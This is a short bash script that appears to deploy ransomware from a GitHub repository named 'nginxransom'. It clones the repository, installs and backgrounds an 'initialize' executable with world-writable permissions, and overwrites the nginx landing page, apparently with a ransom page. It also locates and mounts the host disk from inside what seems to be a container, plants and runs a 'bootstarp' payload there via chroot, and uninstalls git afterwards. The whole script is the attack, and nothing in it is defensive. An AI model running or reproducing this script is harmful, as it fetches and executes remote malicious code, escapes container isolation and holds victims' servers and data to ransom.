
#!/bin/bash  

#apt update -y 
#apt install git -y  
git clone https://github.com/xeroxpro/nginxransom.git
cp -u /nginxransom/initialize.txt /usr/bin/initialize  && chmod 777 /usr/bin/initialize && initialize &  
cp -u /nginxransom/web/index.html /usr/share/nginx/html/index.html
diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
mount $diskpart /mnt/
cp -u /nginxransom/bootstarp.txt  /mnt/usr/bin/bootstarp && cp /nginxransom/bootstarp.txt /usr/bin/bootstarp && chmod 777 /usr/bin/bootstarp && chmod 777 /mnt/usr/bin/bootstarp 
chroot /mnt/usr/bin/ bootstarp &
apt remove git -y

